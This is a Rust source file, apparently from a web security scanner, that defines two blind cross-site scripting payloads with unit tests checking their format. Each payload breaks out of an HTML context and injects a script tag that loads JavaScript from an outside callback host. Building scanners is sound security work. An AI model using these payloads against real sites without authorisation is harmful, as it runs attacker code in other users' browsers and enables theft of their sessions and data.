pub const XSS_BLIND_PAYLOADS: &[&str] = &[
    "\"'><script src={}></script>",
    "-->\"'></script><script src={}></script>",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blind_payloads_not_empty() {
        assert!(!XSS_BLIND_PAYLOADS.is_empty());
    }

    #[test]
    fn test_blind_payloads_contain_callback_placeholder() {
        for p in XSS_BLIND_PAYLOADS {
            assert!(
                p.contains("{}"),
                "blind payload must contain '{{}}' callback placeholder: {}",
                p
            );
        }
    }

    #[test]
    fn test_blind_payloads_contain_script_tag() {
        for p in XSS_BLIND_PAYLOADS {
            assert!(
                p.contains("<script"),
                "blind payload must use script tag for remote loading: {}",
                p
            );
        }
    }

    #[test]
    fn test_blind_payloads_no_duplicates() {
        let mut seen = std::collections::HashSet::new();
        for p in XSS_BLIND_PAYLOADS {
            assert!(seen.insert(p), "duplicate blind payload: {}", p);
        }
    }
}
